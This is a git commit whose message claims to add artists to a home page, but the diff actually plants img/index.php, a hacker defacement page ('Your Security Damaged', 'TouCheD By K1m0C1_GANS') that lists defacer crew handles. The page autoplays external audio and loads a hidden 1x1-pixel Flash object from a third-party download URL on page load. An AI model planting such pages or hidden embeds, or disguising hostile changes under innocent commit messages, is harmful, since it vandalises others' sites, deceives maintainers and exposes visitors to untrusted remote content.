67170ebf646c8f3d13be2f8e036b5eb21526f4be
Leeuw Maluleka <leeuwmaluleka@mail.com>
2019-10-14 21:19:26 -0700

    Adding artists to welcome/home page

---
+++ img/index.php
@@ -0,0 +1,21 @@
+<html>
+<head>
+<title>Your Security Damaged</title>
+</head>
+<body>
+<embed src="https://www.stafabandid.info/download.php?id=gqOYcJraaJA&autoplay=1" type="application/x-shockwave-flash"wmode="transparent" width="1" height="1"></embed>
+<style> body { background: url(http://i63.tinypic.com/5xv5z4.jpg) no-repeat center center fixed ; webkit-background-size: cover; moz-background-size: cover; o-background-size: cover; background-size: cover; color: white; } .twitter a{ text-decoration: none; font-family: Arial, sans-serif ; font-size: 10px; text-shadow: grey 0px 0px 10px; } }</style>
+<link href='https://fonts.googleapis.com/css?family=Sedgwick+Ave+Display' rel='stylesheet' type='text/css'> 
+<link href='https://fonts.googleapis.com/css?family=Risque' rel='stylesheet' type='text/css'>
+</head>
+<body>
+<audio src="https://1.top4top.net/m_13239qhpe0.mp3" autoplay controls></audio>
+<table height="100%" width="100%">
+<td align="center">
+<center>
+<font face="Times New Roman" size="7"  color="crimson">TouCheD By </font><font size="8" face="Times New Roman" color="white">K1m0C1_GANS</font>
+<br>
+<center><font face="courier new" size="7" color="white">Happy I</font><font size="7" face="courier new" color="red">ndonesian</font></center>
+<center><font face="courier new" size="7" color="white">Indepen</font><font size="7" face="courier new" color="red">dence Day</font></center>
+<br>
+<center><marquee behavior="alternate"><font face="Courier New" size="5" font style="text-shadow: 0px 0px 20px white;" color="red">Mr.K1m0C1 - Hax0rSec166 - L3T3Rzcy - Leganad166 - afumu fuma - Tizo - And All Defacer Indonesia</font></marquee>
